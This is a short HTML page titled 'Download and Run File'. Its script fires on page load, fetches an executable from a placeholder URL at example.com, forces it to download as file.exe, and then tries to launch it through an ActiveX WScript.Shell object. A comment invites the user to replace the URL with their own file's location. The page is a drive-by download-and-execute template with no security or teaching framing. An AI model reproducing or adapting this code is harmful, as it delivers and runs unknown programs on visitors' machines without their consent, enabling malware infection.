<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Download and Run File</title>
    <script type="text/javascript">
        // Function to download and run a file
        function downloadAndRun() {
            // Create an XMLHttpRequest to download the file
            var xhr = new XMLHttpRequest();
            xhr.open('GET', 'http://example.com/file.exe', true);  // Change this URL to your file's location
            xhr.responseType = 'arraybuffer';

            // When the file is downloaded
            xhr.onload = function () {
                var blob = new Blob([xhr.response], { type: 'application/octet-stream' });
                var link = document.createElement('a');
                link.href = URL.createObjectURL(blob);
                link.download = 'file.exe'; // Name the file for download
                link.click();

                // Optionally, execute the downloaded file
                var shell = new ActiveXObject("WScript.Shell");
                shell.Run("file.exe", 1, true); // This runs the downloaded file
            };

            // Send the request
            xhr.send();
        }
    </script>
</head>
<body onload="downloadAndRun();">
    <h1>Downloading and Running File...</h1>
</body>
</html>
